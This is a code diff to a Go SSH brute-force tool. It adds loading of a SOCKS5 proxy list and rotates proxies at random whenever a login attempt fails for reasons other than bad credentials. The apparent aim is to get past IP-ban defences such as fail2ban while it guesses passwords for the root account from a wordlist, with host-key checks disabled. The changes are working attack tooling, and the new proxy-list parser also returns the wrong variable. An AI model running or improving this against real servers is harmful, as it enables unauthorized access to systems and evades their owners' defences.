@@ -19,6 +19,8 @@ var sem = make(chan struct{}, 1)
 var wg sync.WaitGroup
 var operationDone = false
 var globalproxy ProxySettings
+var proxies []ProxySettings
+var useProxyList = false
 
 type ProxySettings struct {
 	ip       string
@@ -27,43 +29,46 @@ type ProxySettings struct {
 	password string
 }
 
-func CustomDialTimeout(network, address string, timeout time.Duration, proxysetting ProxySettings) (net.Conn, error) {
+func CustomDialTimeout(network, address string, timeout time.Duration, proxySetting ProxySettings) (net.Conn, error, bool) {
 	d := net.Dialer{Timeout: timeout}
-	if proxysetting.ip == "" {
-		return d.Dial(network, address)
+	if proxySetting.ip == "" {
+		conn, err := d.Dial(network, address)
+		return conn, err, false
 	}
-	if proxysetting.username != "" {
+	if proxySetting.username != "" {
 		auth := proxy.Auth{
-			User:     proxysetting.username,
-			Password: proxysetting.password,
+			User:     proxySetting.username,
+			Password: proxySetting.password,
 		}
-		dialSocksProxy, err := proxy.SOCKS5("tcp", proxysetting.ip+":"+strconv.Itoa(proxysetting.port), &auth, &d)
+		dialSocksProxy, err := proxy.SOCKS5("tcp", proxySetting.ip+":"+strconv.Itoa(proxySetting.port), &auth, &d)
 		if err != nil {
-			return nil, err // todo: throw different error (rotate proxy because its not reachable)
+			return nil, err, true // todo: throw different error (rotate proxy because its not reachable)
 		}
-		return dialSocksProxy.Dial(network, address)
+		conn, err := dialSocksProxy.Dial(network, address)
+		return conn, err, false
 	}
-	dialSocksProxy, err := proxy.SOCKS5("tcp", proxysetting.ip+":"+strconv.Itoa(proxysetting.port), nil, &d)
+	dialSocksProxy, err := proxy.SOCKS5("tcp", proxySetting.ip+":"+strconv.Itoa(proxySetting.port), nil, &d)
 	if err != nil {
-		return nil, err // todo: throw different error (rotate proxy because its not reachable)
+		return nil, err, true // todo: throw different error (rotate proxy because its not reachable)
 	}
-	return dialSocksProxy.Dial(network, address)
+	conn, err := dialSocksProxy.Dial(network, address)
+	return conn, err, false
 }
 
-func CustomDial(network, addr string, config *ssh.ClientConfig, proxysetting ProxySettings) (*ssh.Client, error) {
-	conn, err := CustomDialTimeout(network, addr, config.Timeout, proxysetting)
+func CustomDial(network, addr string, config *ssh.ClientConfig, proxySetting ProxySettings) (*ssh.Client, error, bool) {
+	conn, err, rotate := CustomDialTimeout(network, addr, config.Timeout, proxySetting)
 	if err != nil {
-		return nil, err
+		return nil, err, rotate
 	}
 	c, chans, reqs, err := ssh.NewClientConn(conn, addr, config)
-	// todo Implement her the fail2ban check
 	if err != nil {
-		return nil, err
+		rotate = !strings.Contains(fmt.Sprint(err), "ssh: unable to authenticate, attempted methods")
+		return nil, err, rotate
 	}
-	return ssh.NewClient(c, chans, reqs), nil
+	return ssh.NewClient(c, chans, reqs), nil, false
 }
 
-func sshlogin(addr string, username string, password string, timeout int64, proxysetting ProxySettings) bool {
+func sshLogin(addr string, username string, password string, timeout int64, proxySetting ProxySettings) (bool, bool) {
 	config := &ssh.ClientConfig{
 		User: username,
 		Auth: []ssh.AuthMethod{
@@ -72,16 +77,20 @@ func sshlogin(addr string, username string, password string, timeout int64, prox
 		HostKeyCallback: ssh.HostKeyCallback(func(hostname string, remote net.Addr, key ssh.PublicKey) error { return nil }),
 		Timeout:         time.Duration(timeout * int64(time.Second)),
 	}
-	client, err := CustomDial("tcp", addr, config, proxysetting)
+	client, err, rotate := CustomDial("tcp", addr, config, proxySetting)
 	if err != nil {
-		return false
+		return false, rotate
 	}
 	client.Close()
-	return true
+	return true, false
 }
 
 func runWordlistPart(addr string, list []string, username string, timeout int64, inverted bool) {
 	time.Sleep(time.Duration(rand.Float64() * float64(time.Second)))
+	localProxy := globalproxy
+	if useProxyList {
+		localProxy = proxies[rand.Intn(len(proxies))]
+	}
 	for _, wordlistline := range list {
 		time.Sleep(time.Duration(rand.Float64() * float64(time.Second) / 2))
 		if operationDone {
@@ -91,9 +100,15 @@ func runWordlistPart(addr string, list []string, username string, timeout int64,
 		pwd := wordlistline
 		if inverted {
 			usr = wordlistline
-			pwd = username // Not the best naming I know :D
+			pwd = username
 		}
-		if sshlogin(addr, usr, pwd, timeout, globalproxy) {
+		result, rotateProxy := sshLogin(addr, usr, pwd, timeout, localProxy)
+		if !result && useProxyList && rotateProxy {
+			fmt.Println("Rotating proxy!")
+			localProxy = proxies[rand.Intn(len(proxies))]
+			continue
+		}
+		if result {
 			fmt.Println("================================")
 			fmt.Println(" Found working combo")
 			fmt.Println(" Username: " + usr)
@@ -122,23 +137,67 @@ func readWordlist(filename string, workerCount int) ([][]string, int, error) {
 		lines = append(lines, s.Text())
 	}
 	f.Close()
-	linecount := len(lines)
+	lineCount := len(lines)
 	var result [][]string
-	totallen := len(lines)
-	partlength := int(len(lines) / workerCount)
-	if partlength == 0 {
-		return nil, 0, fmt.Errorf("Error while worker assigment: more or equal worker assigned than wordlist entries.")
+	partLength := int(lineCount / workerCount)
+	if partLength == 0 {
+		return nil, 0, fmt.Errorf("error while worker assigment: more or equal worker assigned than wordlist entries")
 	}
 	count := 0
-	for i := 0; i < totallen; i += partlength {
-		customlen := partlength
-		if i+customlen > totallen {
-			customlen = totallen - i
+	for i := 0; i < lineCount; i += partLength {
+		customlen := partLength
+		if i+customlen > lineCount {
+			customlen = lineCount - i
 		}
 		result = append(result, lines[i:i+customlen])
 		count++
 	}
-	return result, linecount, nil
+	return result, lineCount, nil
+}
+
+func readProxyList(filename string) ([]ProxySettings, int, error) {
+	f, err := os.Open(filename)
+	if err != nil {
+		return nil, 0, err
+	}
+	s := bufio.NewScanner(f)
+	s.Split(bufio.ScanLines)
+	var lines []string
+	for s.Scan() {
+		lines = append(lines, s.Text())
+	}
+	f.Close()
+	var proxies_ []ProxySettings
+	for _, line := range lines {
+		proxyEntry := ProxySettings{}
+		proxyData := strings.Split(line, " ")
+		if len(proxyData) == 0 {
+			fmt.Println("not valid proxy-line found: " + line + " should be 'ip:port' or 'ip:port username:password'")
+			continue
+		}
+		pos := strings.Index(proxyData[0], ":")
+		if pos != -1 {
+			proxyEntry.ip = proxyData[0][0:pos]
+			portproxy, err := strconv.Atoi(proxyData[0][pos+1 : len(proxyData[0])])
+			if err != nil {
+				fmt.Println("not valid proxy-line found: " + line + " should be 'ip:port' or 'ip:port username:password'")
+				continue
+			}
+			proxyEntry.port = portproxy
+		} else {
+			fmt.Println("not valid proxy-line found: " + line + " should be 'ip:port' or 'ip:port username:password'")
+			continue
+		}
+		if len(proxyData) == 2 && proxyEntry.ip != "" && proxyData[1] != "" {
+			pos = strings.Index(proxyData[1], ":")
+			if pos != -1 {
+				proxyEntry.username = proxyData[1][0:pos]
+				proxyEntry.password = proxyData[1][pos+1 : len(proxyData[1])]
+			}
+		}
+		proxies_ = append(proxies_, proxyEntry)
+	}
+	return proxies, len(lines), nil
 }
 
 func main() {
@@ -146,6 +205,7 @@ func main() {
 	port := 22
 	username := "root"
 	wordlistPath := "./smalllist.txt"
+	proxiesPath := "./socket5_proxies.txt"
 	workerCount := 10
 	timeout := 3
 	inverted := false
@@ -161,6 +221,7 @@ func main() {
 	flag.IntVar(&timeout, "t", 3, "Specify Timeout. Default is 3")
 	flag.BoolVar(&inverted, "i", false, "Specify Inversion mode, bruteforce username with one password. Default is false")
 	flag.StringVar(&wordlistPath, "w", "./smalllist.txt", "Specify wordlist. Default is ./smalllist.txt")
+	flag.StringVar(&proxiesPath, "proxies", "", "Specify proxy list. Default is empty")
 	flag.StringVar(&proxyaddr, "proxy", "", "Specify proxy in format ip:port. Default is no proxy usage")
 	flag.StringVar(&proxycreds, "proxy-credentials", "", "Specify proxy credentials in format username:password. Default is empty")
 	flag.Usage = func() {
@@ -186,6 +247,20 @@ func main() {
 		}
 	}
 
+	usedproxies := 0
+
+	if proxiesPath != "" {
+		proxiesTmp, count, err := readProxyList(proxiesPath)
+		if err != nil {
+			fmt.Println(" Error while parsing the proxy list file")
+			os.Exit(1)
+			return
+		}
+		useProxyList = true
+		proxies = proxiesTmp
+		usedproxies = count
+	}
+
 	fmt.Println("                                                                                        ")
 	fmt.Println("  _|_|_|_|  _|_|_|_|  _|    _|    _|_|_|    _|                                          ")
 	fmt.Println("  _|        _|        _|    _|  _|        _|_|_|_|    _|_|    _|  _|_|  _|_|_|  _|_|    ")
@@ -201,6 +276,8 @@ func main() {
 	fmt.Println(" workers  : " + strconv.Itoa(workerCount))
 	fmt.Println(" wordlist : " + wordlistPath)
 	fmt.Println(" Inverted : " + strconv.FormatBool(inverted))
+	fmt.Println(" ProxyPath: " + proxiesPath)
+	fmt.Println(" Loaded ^ : " + strconv.Itoa(usedproxies))
 	if globalproxy.ip != "" {
 		fmt.Println(" ============= Proxy  ============= ")
 		fmt.Println(" ip       : " + globalproxy.ip)
@@ -213,6 +290,7 @@ func main() {
 	}
 	fmt.Println(" Type -h for help")
 	fmt.Println()
+
 	target := addr + ":" + strconv.Itoa(port)
 	fmt.Println(" Load Wordlist: " + wordlistPath)
 	wordlists, linecount, err := readWordlist(wordlistPath, workerCount)
